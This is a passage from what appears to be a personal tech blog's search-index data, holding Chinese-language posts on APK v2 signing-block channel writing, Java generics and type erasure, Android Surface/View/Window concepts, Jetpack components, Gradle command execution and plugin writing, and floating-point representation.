contentEntry.arrayOffset() + contentEntry.position(), contentEntry.remaining()); //2. write new apk v2 scheme block fIn.write(newApkSigningBlock.array(), newApkSigningBlock.arrayOffset() + newApkSigningBlock.position(), newApkSigningBlock.remaining()); //3. write central dir block fIn.write(centralDir.array(), centralDir.arrayOffset() + centralDir.position(), centralDir.remaining()); //4. write eocd block fIn.write(eocd.array(), eocd.arrayOffset() + eocd.position(), eocd.remaining()); fIn.setLength(apkLength); System.out.println(\"addIdValueByteBufferMap , after add channel , new apk is \" + destApk.getAbsolutePath() + \" , length = \" + apkLength);&#125; 首先读取出原本的id-values，代码我们前面已经分析过，与我们要添加的id-value放到一个map中。然后调用 1V2SchemeUtil.generateApkSigningBlock 重新生成一个新的签名块，这里不看了，其实就是根据上图的字节描述，很容易生成。再根据新的签名块，和之前的中间目录偏移量，计算出新的偏移量，调整EOCD中的相关值。最后，通过RandomAccessFile重新写入： 块1 新的签名块 中间目录块 EOCD块 完工！关于V2的gradle部分与V1部分基本一致，不再赘述。 最后，对于文中的块1+签名块+块2+块3，主要是为了方便理解，大家可以再去了解下zip文件格式，对应到专业的术语上去。 参考 https://github.com/Tencent/VasDolly https://source.android.com/security/apksigning/v2 VasDolly实现原理 安卓再爆重大安全漏洞 黑客可以任意篡改App","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"关于Java泛型的一些思考","slug":"关于Java泛型的一些思考","date":"2018-10-29T13:00:56.000Z","updated":"2020-05-11T07:23:44.827Z","comments":true,"path":"2018/10/29/关于Java泛型的一些思考/","link":"","permalink":"https://superxlcr.github.io/2018/10/29/关于Java泛型的一些思考/","excerpt":"","text":"为什么引入泛型泛型，即“参数化类型”。是Java 1.5引入的一种新特性。为什么Java要引入泛型呢？我们看一下这个例子： 12345678List arrayList = new ArrayList();arrayList.add(\"aaaa\"); // it's okarrayList.add(100); // it's ok, toofor (int i = 0; i &lt; arrayList.size(); i++) &#123; String str = (String)arrayList.get(i); System.out.print(str);&#125; 毫无疑问，程序的运行结果会以崩溃结束：java.lang.ClassCastException: java.lang.Integer cannot be cast to java.lang.String 这个例子中，我们构造了一个ArrayList列表，并往其中放入了一个String类型与一个Integer类型。而在使用时，我们都是以String类型的方式来强转取出，因此程序崩溃了。为了让这种类似的容器类能够带上其内容的类型信息，解决类似的类型转换问题，泛型应运而生。有了泛型之后，我们的例子可以优化成这个样子： 12345678List&lt;String&gt; arrayList = new ArrayList&lt;String&gt;();arrayList.add(\"aaaa\"); // it's okarrayList.add(100); // it's not ok !!!!for (int i = 0; i &lt; arrayList.size(); i++) &#123; String str = (String)arrayList.get(i); System.out.print(str);&#125; 泛型能让编译器在编译阶段避免不少类似的类型转换问题。 泛型的使用泛型的使用主要有三种： 泛型类：通常定义于各种容器类中，如List&lt;T&gt; 泛型方法：提供类型参数推断的功能，很方便 泛型构造方法：博主感觉与泛型方法类似，只是为了区分普通方法与构造方法，因此有了泛型方法与泛型构造方法 从Java的Type体系中我们可以看出三种泛型的定义： Type是Java中所有类型的公共高级接口，其子类如下： ParameterizedType：参数化类型，即泛型；例如：List&lt;T&gt;、Map&lt;K,V&gt;等带有参数化的类 TypeVariable：类型变量，即泛型中的变量；例如：T、K、V等变量，可以表示任何类；在这需要强调的是，TypeVariable代表着泛型中的变量，而ParameterizedType则代表整个泛型 GenericArrayType：泛型数组类型，用来描述ParameterizedType、TypeVariable类型的数组；即List&lt;T&gt;[] 、T[]等 Class：上三者不同，Class是Type的一个实现类，属于原始类型，是Java反射的基础，对Java类的抽象 WildcardType：泛型表达式（或者通配符表达式），即？ extend Number、？ super Integer这样的表达式 其中，TypeVariable的接口定义如下： 1public interface TypeVariable&lt;D extends GenericDeclaration&gt; extends Type &#123; 可以看到，它也是一个泛型类，它的泛型表示的是：它所表示的类型变量的具体种类，是泛型类、泛型方法还是泛型构造方法GenericDeclaration的子类如下图所示： 从图中可以看出：Method、Constructor、Class分别表示类、方法以及构造方法三种泛型 更多泛型的使用与特性可以参考博主以前的文章：泛型常用特点，List&lt;String&gt;能否转为List&lt;Object&gt; 泛型的擦除泛型的擦除可谓是Java泛型的一大特点，那么什么是泛型擦除呢？博主认为：泛型擦除即我们无法获得某个泛型实例对象的精确泛型参数 我们可以从两个现象来看这个特点： 泛型类中的编译器静态检查 泛型类反射 泛型类中的编译器静态检查我们来看下下面的例子： 123456789101112131415161718class A &#123; public void fa() &#123;&#125;; &#125; class C &lt;T&gt; &#123; // 擦除到Object T t; public void f(Object a) &#123; if (a instanceof T) &#123;&#125; // error，不知道具体的类型信息 T var = new T(); // error，不知道该类型是否有默认构造函数 T[] array = new T[1]; // error t.fa(); // error &#125; &#125;class D &lt;T extends A&gt; &#123; // 擦除到A T t; public void f(Object a) &#123; t.fa(); // this works &#125; &#125; 当我们的编译器执行静态检查时，是没有运行时的信息的因此，对于例子中的泛型类C，编译器只能把它的泛型参数T当做其上界来处理（即把类型信息擦除到边界），由于Object类为所有类的父类，因此编译器检查时T都是被当成Object类来处理的当然这种情况我们可以使用extends关键字来改善，对于例子中的泛型类D，其泛型参数的上界就变为了类A 泛型类反射要解释这个，我们需要先知道Java提供的反射功能是什么Java的反射功能，是Java提供的一种允许我们在运行时，获取某个类（class）全部信息的能力，包括类的成员变量，方法，构造函数等等，同时还提供了一系列设置与调用的手段 我们来看下下面的例子： 123456789101112131415161718192021222324class A &#123;&#125; class B extends A &#123;&#125; class C extends B &#123;&#125;; class D &lt;T&gt; &#123; T t; D(T t) &#123; this.t = t; &#125; public void f() &#123; System.out.println(Arrays.toString(this.getClass().getTypeParameters())); &#125; &#125;; public class Main &#123; public static void main(String[] args) &#123; D&lt;A&gt; a = new D&lt;A&gt;(new A()); D&lt;B&gt; b = new D&lt;B&gt;(new B()); D&lt;C&gt; c = new D&lt;C&gt;(new C()); a.f(); b.f(); c.f(); &#125; &#125; D中的f方法通过获取D的Class类来获取其类型信息，其打印的结果如下： 可以看到打印出来的结果并不是我们传人的泛型参数A、B、C三个类，这是为什么呢？博主认为，这是因为这里用的是Java的反射机制获取D类的类型信息，而泛型参数实际上应该属于生成实例时传入的参数，因此我们只能获取类相关的信息，即TypeVariable（类型变量）以及它的名称T，而不能获取实例相关的泛型实际参数A、B、C 受这个特点影响比较大的要数如Gson等支持反序列化泛型对象的工具了： 12345678class Foo&lt;T&gt; &#123; T value;&#125;Gson gson = new Gson();Foo&lt;Bar&gt; foo = new Foo&lt;Bar&gt;();gson.toJson(foo); // May not serialize foo.value correctlygson.fromJson(json, foo.getClass()); // Fails to deserialize foo.value as Bar 上面是一段Gson的官方例子，可以想象到从foo实例中通过反射获取Foo类中的泛型参数是失败的由于泛型参数的缘故，我们只能拿到TypeVariable（类型变量）以及它的名称T，并不能获得实际的Bar类官方介绍链接：https://github.com/google/gson/blob/master/UserGuide.md#serializing-and-deserializing-generic-types 那么有没有什么方法可以缓解这种问题呢？当然是有的，反射可以帮助我们获取类型相关的信息，因此这种情况我们只需要继承实现一个子类就可以了： 12345678910Class Foo&lt;T&gt; &#123; T value;&#125;Class SubFoo extends Foo&lt;String&gt; &#123; &#125;Class clazz = SubFoo.class;ParameterizedType type = (ParameterizedType)clazz.getGenericSuperclass();type.getActualTypeArguments()[0]; // String Class 在继承实现子类的时候，由于我们显式地定义了SubFoo类的基类Foo的泛型参数，因此通过Java的反射，我们也能轻松的获取相关的泛型信息可以看到Gson官方提供的解决方案也是类似的： 1234Type fooType = new TypeToken&lt;Foo&lt;Bar&gt;&gt;() &#123;&#125;.getType();gson.toJson(foo, fooType);gson.fromJson(json, fooType); 通过继承创建匿名内部类TypeToken后，再使用Java的反射机制，获取相关的泛型信息(TypeToken内部的源码在此就不进行分析了) 补充泛型其实是Java中的一种语法糖（Syntactic Sugar），也称糖衣语法，是由英国计算机学家Peter.J.Landin发明的一个术语，指在计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用Java中最常用的语法糖主要有泛型、变长参数、条件编译、自动拆装箱、内部类等。虚拟机并不支持这些语法，它们在编译阶段就被还原回了简单的基础语法结构，这个过程成为解语法糖Java语言在JDK1.5之后引入的泛型实际上只在程序源码中存在，在编译后的字节码文件中，就已经被替换为了原来的原生类型，并且在相应的地方插入了强制转型代码，因此对于运行期的Java语言来说，ArrayList和ArrayList就是同一个类。所以泛型技术实际上是Java语言的一颗语法糖，Java语言中的泛型实现方法称为类型擦除，基于这种方法实现的泛型被称为伪泛型","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android的Surface、View、SurfaceView、Window概念整理","slug":"Android的Surface、View、SurfaceView、Windowg概念整理","date":"2018-10-23T11:35:39.000Z","updated":"2020-05-11T07:23:44.605Z","comments":true,"path":"2018/10/23/Android的Surface、View、SurfaceView、Windowg概念整理/","link":"","permalink":"https://superxlcr.github.io/2018/10/23/Android的Surface、View、SurfaceView、Windowg概念整理/","excerpt":"","text":"最近了解了一下Android中几个关于视图的概念：Surface、View、SurfaceView与Window，在此进行一下总结整理 BufferQueue在此之前，我们先介绍一下BufferQueue。BufferQueue类是 Android 中所有图形处理操作的核心。它的作用很简单：将生成图形数据缓冲区的一方（生产方）连接到接受数据以进行显示或进一步处理的一方（消耗方）。几乎所有在系统中移动图形数据缓冲区的内容都依赖于BufferQueue。简而言之，BufferQueue是图形生产者消费者模型中沟通的桥梁。它的基本用法很简单：生产方请求一个可用的缓冲区 (dequeueBuffer())，并指定一组特性，包括宽度、高度、像素格式和用法标记。生产方填充缓冲区并将其返回到队列 (queueBuffer())。随后，消耗方获取该缓冲区 (acquireBuffer()) 并使用该缓冲区的内容。当消耗方操作完毕后，将该缓冲区返回到队列 (releaseBuffer())。 更详细介绍可参考官方文档：https://source.android.com/devices/graphics/arch-bq-gralloc SurfaceFlinger在介绍Surface之前，我们还需要先了解一下SurfaceFlinger。SurfaceFlinger的作用是接受来自多个来源的数据缓冲区，对它们进行合成，然后发送到显示设备。当别的服务向SurfaceFlinger请求一个绘图Surface时，它会创建一个主要组件是BufferQueue的新的层（这里的层博主感觉指的是一层层的视图的意思），同时把自己设定为消耗方。大多数应用通常在屏幕上有三个层：屏幕顶部的状态栏、底部或侧面的导航栏以及应用的界面。我们可以通过adb的指令来打印当前屏幕的层信息： 1adb shell dumpsys SurfaceFlinger 例，博主的某个应用的信息： 从上面的表格不难看出，博主当前的屏幕中包含3个层（自底向上）： 应用的MainActivity视图层 StatusBar系统的状态栏视图层 HWC_FRAMEBUFFER_TARGET（目前不清楚是什么） 更详细介绍可参考官方文档：https://source.android.com/devices/graphics/arch-sf-hwc Surface从 1.0 开始，Surface类一直是公共 API 的一部分。它的描述简单如下：“在由屏幕合成器管理的原始缓冲区上进行处理”。Surface表示通常（但并非总是！）由SurfaceFlinger消耗的缓冲区队列的生产方。当您渲染到Surface上时，产生的结果将进入相关缓冲区，该缓冲区被传递给消耗方。简单来说，博主认为我们可以把Surface当做是一层视图，我们通过在Surface上绘制图像，来往其中的BufferQueue生产视图数据，进而交给其消耗方SurfaceFlinger来与其他视图层合成，最终显示到屏幕上。 更详细介绍可参考官方文档：https://source.android.com/devices/graphics/arch-shhttps://developer.android.com/reference/android/view/Surface WindowWindow类代表着一个视图的顶层窗口，它管理着这个视图中最顶层的View，提供了一些背景、标题栏、默认按键等标准的UI处理策略。同时，它拥有唯一一个用以绘制自己的内容的Surface，当app通过WindowManager创建一个Window时，WindowManager会为每一个Window创建一个Surface，并把该Surface传递给app以便应用在上面绘制内容。博主认为Window与Surface之前存在着一对一的关系。 更详细介绍可参考官方文档：https://developer.android.com/reference/android/view/Window ViewView这个类相信大家都普遍比较熟悉，它是Android视图中的一个基本单位。它代表着屏幕上的一个矩形区域，并负责绘制该区域以及处理区域上的点击事件。它与ViewGroup通过组合设计模式，共同组成了Android视图的基石，通过最顶层的ViewRootImpl我们可以一层层遍历View组成的树状结构。最顶层的View会由某个Window进行打理，在对其复杂的层级结构进行测量、布局、绘制后，其中的所有内容最终会绘制到Window拥有的Surface中去。 更详细介绍可参考官方文档：https://developer.android.com/reference/android/view/View SurfaceViewSurfaceView是一种被特殊实现的View，它拥有自己专门的一个Surface，以便让应用直接在里面绘制内容。它能与普通的View一样，在View组成的树状结构中进行测量与布局，但却独立于普通View所共享Window的那个Surface。它在需要渲染时，内容会变得完全透明，SurfaceView的View部分只是一个透明的占位符。SurfaceView的工作原理如下，它所做的全部就是要求WindowManager创建一个Window，并告诉WindowManager所创建的Window的Z轴顺序（Z-order），这个Z轴顺序可以帮助WindowManager决定将新建的window置于SurfaceView所属Window的前面还是后面。然后，WindowManager会将新建的Window放置到SurfaceView在所属Window中的位置。如果新建Window在SurfaceView所属Window后面，SurfaceView会将它在所属Window中占据的部分变透明，以便让后面的Window显示出来。 更详细介绍可参考官方文档：https://source.android.com/devices/graphics/arch-sv-glsvhttps://developer.android.com/reference/android/view/SurfaceView","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"Android架构组件学习（一）","slug":"Android架构组件学习（一）","date":"2018-10-09T13:17:00.000Z","updated":"2020-05-11T07:23:44.601Z","comments":true,"path":"2018/10/09/Android架构组件学习（一）/","link":"","permalink":"https://superxlcr.github.io/2018/10/09/Android架构组件学习（一）/","excerpt":"","text":"前言为了帮助广大开发者更好更快的开发出新的app，google推出了Android Jetpack项目Android Jetpack主页：https://developer.android.com/jetpack/ Android Jetpack 是一套组件、工具和指导，可以帮助我们构建出色的 Android 应用。Android Jetpack 组件将现有的支持库与架构组件联系起来，并将它们分成四个类别 基础组件（Foundation） 架构组件（Architecture） 行为组件（Behavior） 视图组件（UI） Android Jetpack 组件以“未捆绑的”库形式提供，这些库不是基础 Android 平台的一部分。 其中，架构组件又包含以下组件： Data Binding：用声明的方式绑定可观察的数据与UI控件 Lifecycles：管理Activity与Fragment的生命周期 LiveData：当底层数据改变时通知UI控件 Navigation：处理所有app内的导航 Paging：从你的数据源中按需地加载信息 Room：使SQLite数据库的使用更便捷 ViewModel：通过生命周期感知的方式来管理UI相关的数据 WorkManager：管理Android的后台工作 最近，博主学习了官方是样例，研究了其中的ViewModel、Room、LiveData三种组件，在此记录一下 官方指南：https://developer.android.com/jetpack/docs/guide代码实验室：https://codelabs.developers.google.com/codelabs/build-app-with-arch-components/index.html#0 ViewModel个人认为，想要理清楚ViewModel的作用，我们需要从MVC设计模式开始慢慢说起 MVCMVC全名是Model View Controller，是模型(model)、视图(view)、控制器(controller)的缩写，一种软件设计典范其示意图如下所示： MVC设计模式的核心在于数据与视图的分离，降低代码的耦合程度，提高代码的重用在管理数据的model层与管理视图的view层实行了分离后，我们可以轻易地为相同的数据提供不同的表现形式比如相同的统计数据，需要展示成柱状图与饼状图等不同的形式。这种情况下，我们可以在不改动model的情况下，直接拓展view层来实现 MVP后来，MVC模式又逐渐发展成了MVP模式MVP全称：Model-View-Presenter，是从经典的模式MVC演变而来其示意图如下所示： 在MVC模式中，controller主要的作用在于分离view层中处理数据的逻辑，view层接收用户的输入，并把输入转交给controller，由controller来解析、处理逻辑并通知model数据层进行相应的修改而当数据发生变动后或者view层需要查找某些数据时，还是直接通过接触model层来获取这样直接获取固然方便，但有时model的数据获取后并不是直接能用的，因此有些获取数据后的业务逻辑不可避免的被塞在了view层 MVP为了解决这个问题，使得view层回归原本的只关注视图的设计，切断了view层与model层的联系在MVP中，view层并不与model层打交道，而是通过presenter层来进行数据的获取这种设计精简了view层的代码，把获取数据后的相关业务逻辑移到了presenter层，使得三部分的职责更分明： view层只关心视图相关的部分 model只关心数据的存取 presenter层负责相关业务逻辑的处理 MVVMMVVM是Model-View-ViewModel的简写，它本质上就是MVC的改进版其示意图如下所示： MVVM模式与MVP模式区别不大，其中的ViewModel层就对应着Presenter层而我们Android架构组件中的ViewModel也是同样的功能，对应着MVP中的Presenter层，负责处理业务逻辑，以及内存中临时存储一些业务相关的变量 除此以外，官方提供的ViewModel组件主要还帮我们处理了生命周期相关的问题ViewModel与Activity的生命周期关系如下： 从图中可以看出，对于屏幕旋转等“非正常”退出的情况下，ViewModel是不会被销毁的，直到Activity正常finish的情况它才销毁 由于我们的view层组件（Activity与Fragment等）的生命周期都是受系统framework层控制的，因此其实它们的状态并不是可控的，系统framework层很可能由于用户的某些行为或一些系统事件把他们销毁掉在这种情况下，如果我们使用了官方的ViewModel组件，一些业务上的初始化逻辑以及业务相关的变量就能顺利保留下来（PS：进程被回收的情况不包括在内，此处并不涉及数据的持久化）当我们在重构视图层的时候，我们只需要直接获取数据即可，不需要担心由于视图层的多次“非正常”销毁与重建导致一些初始化逻辑不断地执行或者是状态错乱 具体ViewModel的用法可以参考官方的文档：https://developer.android.com/topic/libraries/architecture/viewmodel#the_lifecycle_of_a_viewmodel Room为了让我们更好、更安全、更高效地使用SQLite数据库，google推出了Room组件方便我们使用Room是一种orm框架（orm即object relation mapping，对象关系映射，博主个人的理解是一种：把操作复杂晦涩难用的SQL语句，改为操作简单浅显易用的Object的方法）它提供了DAO层（即data access object，数据访问对象），让我们通过使用DAO层代替直接使用SQL语句，减少SQL语句的编写，减少出错的几率同时，它还把SQL语句的检查过程提前到了程序编译阶段，方便我们更好更快地发现问题 具体Room的用法可以参考官方的文档：https://developer.android.com/training/data-storage/room/ LiveDataLiveData是一款可观察数据的持有组件，与别的观察者不一样的是，该组件是可感知生命周期的LiveData保证只有在app组件是活跃状态的情况下（即处于STARTED或者是RESUMED状态），才进行观察者的回调，而在不活跃的状态下是不会收到任何通知的并且当app组件（其实是实现了LifecycleOwner接口的类都可以）转换到了DESTROYED状态后，LiveData会自动注销相关的观察者 稍微总结一下，使用LiveData的好处有： 避免内存泄露：平常我们使用异步回调比较头疼的问题在于，在app组件生命周期结束的时候应该合理的释放回调，因为一般而言界面结束之后并不关心回调的结果了，如果没有合理释放的话，会因为内部类持有外部引用的问题，导致我们生命周期结束的app组件无法被回收，从而造成内存泄露。在使用了LiveData之后，由于其自动注销DESTROYED状态观察者的特性，我们并不用关系这个问题 避免一些生命周期相关的问题：像我们平常遇见比较多的Fragment#getContext为null的问题，以及一些在Activity组件结束后更新其中的UI组件或者dialog弹层等异常崩溃问题，都是由于在app组件非活跃状态下进行了一些不当的UI操作造成的，而这些操作往往是通过异步回调带来的。LiveData只在活跃状态下回调的特性，可以很好地帮助我们避免这些奇奇怪怪的问题 保证更新到最新的数据：LiveData中的数据是有version版本记录的，当它发现注册观察者接收数据的版本低于其version值时，便会尝试回调新数据过去。这种特性能很好地帮助我们在app组件意外销毁后，重建时直接获取数据进行复原（通过使用ViewModel可以使得LiveData的数据再app组件“非正常”销毁的情况下得以保留） 具体LiveData的用法可以参考官方的文档：https://developer.android.com/topic/libraries/architecture/livedata","categories":[],"tags":[]},{"title":"编译原理————词法分析","slug":"编译原理————词法分析","date":"2018-10-08T06:54:13.000Z","updated":"2020-05-11T07:23:44.899Z","comments":true,"path":"2018/10/08/编译原理————词法分析/","link":"","permalink":"https://superxlcr.github.io/2018/10/08/编译原理————词法分析/","excerpt":"","text":"最近总结了一下编译原理中，词法分析篇章的思维导图其中感觉较难理解的部分并未记录，还有很多需要补充的地方","categories":[{"name":"编译原理","slug":"编译原理","permalink":"https://superxlcr.github.io/categories/编译原理/"}],"tags":[{"name":"编译原理","slug":"编译原理","permalink":"https://superxlcr.github.io/tags/编译原理/"}]},{"title":"gradle执行命令行","slug":"gradle执行命令行","date":"2018-09-20T13:13:11.000Z","updated":"2020-05-11T07:23:44.772Z","comments":true,"path":"2018/09/20/gradle执行命令行/","link":"","permalink":"https://superxlcr.github.io/2018/09/20/gradle执行命令行/","excerpt":"","text":"最近博主在编写gradle相关脚本时，需要执行相关的命令行指令，在此记录一下踩过的坑 如何执行命令行首先，需要执行命令行，我们有两种不同的方式达成： 可以通过定义type类型为Exec的task来完成： 1234task execTask(type: Exec) &#123; workingDir &apos;./&apos; commandLine &apos;cmd&apos;, &apos;/c&apos;, ...&#125; 也可以通过调用Project#exec来完成： 12345678exec &#123; workingDir = &apos;./&apos; def commands = [] commands &lt;&lt; &apos;cmd&apos; commands &lt;&lt; &apos;/c&apos; ... commandLine = commands&#125; 区分操作系统值得注意的是，一般而言我们并不能直接把需要执行的指令输入给commandLine变量，而是需要在前面加入’cmd /c’参数才行（这里代表的应该是指重新打开一个命令行窗口执行相关指令）当然这只是在windows系统上的做法，在其他操作系统上，我们应该加入参数’bash -c’ 因此我们应该补上这样一段代码： 12345678910def commands = []if (System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;)) &#123; commands &lt;&lt; &apos;cmd&apos; commands &lt;&lt; &apos;/c&apos;&#125; else &#123; commands &lt;&lt; &apos;bash&apos; commands &lt;&lt; &apos;-c&apos;&#125;commands &lt;&lt; realCommandscommandLine = commands","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"gradle插件编写","slug":"gradle插件编写","date":"2018-09-06T11:49:35.000Z","updated":"2020-05-11T07:23:44.773Z","comments":true,"path":"2018/09/06/gradle插件编写/","link":"","permalink":"https://superxlcr.github.io/2018/09/06/gradle插件编写/","excerpt":"","text":"最近在整理项目中的aop功能模块，在使用了他人的gradle插件发现有不满意的地方，因此稍微了解了一下如何编写gradle插件，在此进行一下记录一些跟gradle相关的基础资料，可以在我的另一篇博文中找到：Gradle介绍 gradle插件工程目录想要编写gradle插件，我们首先需要自己组建好相应的工程目录，与其他的module不同，Android Studio并没有便捷的方式让我们一键生成相应的插件工程目录，我们需要自己把所需的文件夹跟文件一个个新建起来插件工程目录截图如下： 下面来逐一说明目录文件的作用： groovy文件夹这个文件夹下面保存的是groovy文件，是我们插件的源代码目录 resources/META-INF/gradle-plugins这个文件夹下面有个xxx.properties文件，用于定义我们的插件名称，我们平时在build.gradle中写的： 1apply plugin: &apos;xxx&apos; 其中的xxx，就是该文件去后缀后定义的名称 文件的内容如下： 1implementation-class=插件实现类的全名 举个例子，比如插件的实现类如下： 123456789101112package com.superxlcr.pluginimport org.gradle.api.Pluginimport org.gradle.api.Projectclass TestPlugin implements Plugin&lt;Project&gt; &#123; @Override void apply(Project project) &#123; &#125;&#125; 可以看到，其实我们在build.gralde调用apply plugin指令，就是在gradle的config阶段执行apply方法里面的内容而已 上述例子的文件具体内容如下： 1implementation-class=com.superxlcr.plugin.TestPlugin .gitignoregit管理工具追踪时忽略的文件，一般标记build文件夹即可： 1/build proguard-rules.proproguard混淆时的规则文件，一般使用随便一个module默认生成的即可： 123456789101112131415161718192021# Add project specific ProGuard rules here.# You can control the set of applied configuration files using the# proguardFiles setting in build.gradle.## For more details, see# http://developer.android.com/guide/developing/tools/proguard.html# If your project uses WebView with JS, uncomment the following# and specify the fully qualified class name to the JavaScript interface# class:#-keepclassmembers class fqcn.of.javascript.interface.for.webview &#123;# public *;#&#125;# Uncomment this to preserve the line number information for# debugging stack traces.#-keepattributes SourceFile,LineNumberTable# If you keep the line number information, uncomment this to# hide the original source file name.#-renamesourcefileattribute SourceFile build.gradle我们gradle插件工程的配置文件，一般而言，配置如下： 123456apply plugin: &apos;groovy&apos;dependencies &#123; implementation gradleApi() implementation localGroovy()&#125; 如果要获取一些跟Android Project相关的属性，以及执行一些注册Transform等操作，我们还需要引用Android提供的工具库： 123dependencies &#123; implementation &apos;com.android.tools.build:gradle:2.3.2&apos;&#125; 增加extension类似Android提供的com.android.application插件，可以在android定义的extension中修改很多属性值，我们的插件也想要自己的extension，要怎么做呢？ Android插件一个修改版本号属性值的例子： 123456android &#123; defaultConfig &#123; versionCode 6901 versionName &quot;6.9.0&quot; &#125;&#125; 想要自己的extension很简单，只要在apply插件的时候，往project中添加注册即可： 1234@Overridevoid apply(Project project) &#123; project.extensions.create(&quot;mytest&quot;, TestExtension)&#125; 定义的extension类如下： 12345678910class TestExtension &#123; boolean testBoolean String testName private List&lt;Integer&gt; testList = new ArrayList&lt;&gt;() void addNumbers(int... numbers) &#123; testList.addAll(numbers) &#125;&#125; 如此一来，我们的插件就有了自己的extension，设置相应的extension时，其实就跟修改定义extension的对象一样： 12345mytest &#123; testBoolean true testName &quot;test&quot; addNumbers 1, 2, 3, 4, 5&#125; 本地maven仓库上传由于apply from本地的groovy文件是不能debug调试的，为了方便我们调试编写的gradle插件，我们一般会将插件上传到本地的maven仓库中想要实现本地maven仓库上传非常简单，配置依赖相应的gradle插件即可，在build.gradle文件中加入： 12345678910111213apply plugin: &apos;maven&apos;version = &apos;1.0.0&apos;group = &apos;com.superxlcr.plugin&apos;archivesBaseName = &apos;test-plugin&apos;uploadArchives &#123; repositories &#123; mavenDeployer &#123; repository(url: &apos;file:E:\\\\mavenTest\\\\myplugintest&apos;) &#125; &#125;&#125; 编写完成后，先调用build task编译生成，然后调用uploadArchives task上传即可： 在使用时，我们只需要在总工程的build.gradle下加上本地maven仓库以及插件名称即可： 12345678910buildscript &#123; repositories &#123; maven &#123; url &apos;file:E:\\\\mavenTest\\\\myplugintest&apos; &#125; &#125; dependencies &#123; classpath &apos;com.superxlcr.plugin:test-plugin:1.0.0&apos; &#125;&#125; ps: 除了使用 maven 插件来上传以外，我们还可以通过 maven-publish 插件来把代码上传到本地仓库 具体配置大致如下所示： 12345678910111213141516171819202122232425262728apply plugin: &apos;maven-publish&apos; // 添加插件// 打包源码task sourceJar(type: Jar) &#123; from sourceSets.main.allJava&#125;publishing &#123; publications &#123; maven(MavenPublication) &#123; // 指定group/artifact/version信息 groupId project.group artifactId project.name version project.version // 打包类型 war: components.web jar: components.java from components.java // 配置上传源码 artifact sourceJar &#123; classifier &quot;sources&quot; &#125; &#125; &#125; repositories &#123; mavenLocal() // 本地 maven &#125;&#125; 配置完成后，执行publishToLocalMaven任务即可，发布位置应该在：用户文件夹/.m2/ 里","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"浮点数的大小比较为什么不能用等号？","slug":"浮点数的大小比较为什么不能用等号？","date":"2018-09-04T12:23:07.000Z","updated":"2020-05-11T07:23:44.858Z","comments":true,"path":"2018/09/04/浮点数的大小比较为什么不能用等号？/","link":"","permalink":"https://superxlcr.github.io/2018/09/04/浮点数的大小比较为什么不能用等号？/","excerpt":"","text":"本文转载自：https://www.cnblogs.com/xiehongfeng100/p/4851201.html 小数在计算机中的表示计算机中是如何存储和表达数字的？对于整数，情况比较简单，直接按照数学中的进制转换方法处理即可，即连续除以2取余。这并不是难点，真正的难点在于小数是如何转换为二进制码（即浮点数）的（注意区别小数和浮点数）当然，从数学的角度来讲，十进制的小数可以转换为二进制小数（整数部分连续除2，小数部分连续乘2），例如125.125D=1111101.001B，但问题在于计算机根本就不认识小数点“.”，更不可能认识1111101.001B。那么计算机是如何处理小数的呢？ PS：上文例子中，0.125D转换为小数如下： 123450.125 * 2 = 0.25 --------- 取00.25 * 2 = 0.5 --------- 取00.5 * 2 = 1 --------- 取1因此0.125D = 0.001B 历史上计算机科学家们曾提出过多种解决方案，最终获得广泛应用的是IEEE 754标准中的方案，目前最新版的标准是IEEE std 754-2008。该标准提出数字系统中的浮点数是对数学中的实数（小数）的近似，同时该标准规定表达浮点数的0、1序列被分为三部分（三个域）： 以32位单精度浮点数为例，其具体的转换规则是： 首先把二进制小数（补码）用二进制科学计数法表示，比如上面给出的例子1111101.001=1.111101001*2^6 符号位sign表示数的正负（0为正，1为负），故此处填0 exponent表示科学计数法的指数部分，请务必注意的是，这里所填的指数并不是前面算出来的实际指数，而是等于实际指数加上一个数（指数偏移），偏移量为2^(e-1)-1，其中e是exponent的宽度（位数）。对于32位单精度浮点数，exponent宽度为8，因此偏移量为127，所以exponent的值为127 + 6 = 133，即10000101 之后的fraction表示尾数，即科学计数法中的小数部分11110100100000000000000（共23位） 因此32位浮点数125.125D在计算机中就被表示为01000010111110100100000000000000。 对于32位单精度浮点数，sign是1位，exponent是8位（指数偏移量是127），fraction是23位。对于64位双精度浮点数，sign是1为，exponent是11位（指数偏移量是1023），fraction是52位。 用程序可以看出小数在计算机中是如何表示的（即浮点数）： 1234567891011121314#include &lt;iostream&gt;#include &lt;bitset&gt;using namespace std;int main()&#123; float input; cin &gt;&gt; input; unsigned long long nMem = *(unsigned long long *)&amp;input; bitset&lt;32&gt; myBit(nMem); cout &lt;&lt; myBit &lt;&lt; endl; return 0;&#125; 运行结果如下： 浮点数的大小比较为什么不能用等号下文将从几个方面来探索这个问题： 浮点数精度不同请见程序： 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cmath&gt;using namespace std;int main()&#123; float a = (float)0.1; float b = (float)0.1; if(a == b) cout &lt;&lt; \"a == b\" &lt;&lt; endl; else cout &lt;&lt; \"a != b\" &lt;&lt; endl; float c = (float)0.1; double d = (double)0.1; if(c == d) cout &lt;&lt; \"c == d\" &lt;&lt; endl; else cout &lt;&lt; \"c != d\" &lt;&lt; endl; float e = 